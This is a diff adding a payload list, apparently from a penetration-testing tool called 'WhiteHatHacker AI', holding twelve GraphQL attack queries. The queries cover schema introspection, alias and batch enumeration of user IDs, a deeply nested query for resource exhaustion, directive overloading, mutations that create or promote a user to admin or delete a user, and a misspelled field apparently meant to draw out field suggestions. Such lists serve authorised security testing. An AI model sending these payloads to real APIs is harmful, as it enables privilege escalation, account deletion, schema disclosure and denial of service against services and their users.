@@ -1,0 +1,19 @@
+# ============================================================================
+# WhiteHatHacker AI — GraphQL Payloads (v3.0)
+# Categories: Introspection, Alias Brute Force, Batch, Depth,
+#   Mutation Guessing, Directive Overloading
+# Total: 12 payloads
+# ============================================================================
+
+{"query":"{ __schema { types { name } } }"}
+{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}
+{"query":"{ __type(name: \"User\") { name fields { name type { name kind } } } }"}
+{"query":"{__schema{queryType{name}mutationType{name}types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}"}
+{"query":"{ a1: user(id: 1) { id } a2: user(id: 2) { id } a3: user(id: 3) { id } }"}
+[{"query":"{ user(id: 1) { id } }"},{"query":"{ user(id: 2) { id } }"}]
+{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}
+{"query":"query @skip(if: false) @include(if: true) { user { name } }"}
+{"query":"mutation { createUser(input: {role: \"admin\"}) { id } }"}
+{"query":"mutation { updateUser(id: \"1\", input: {role: \"admin\"}) { id } }"}
+{"query":"mutation { deleteUser(id: \"1\") { success } }"}
+{"query":"{ usre { name } }"}
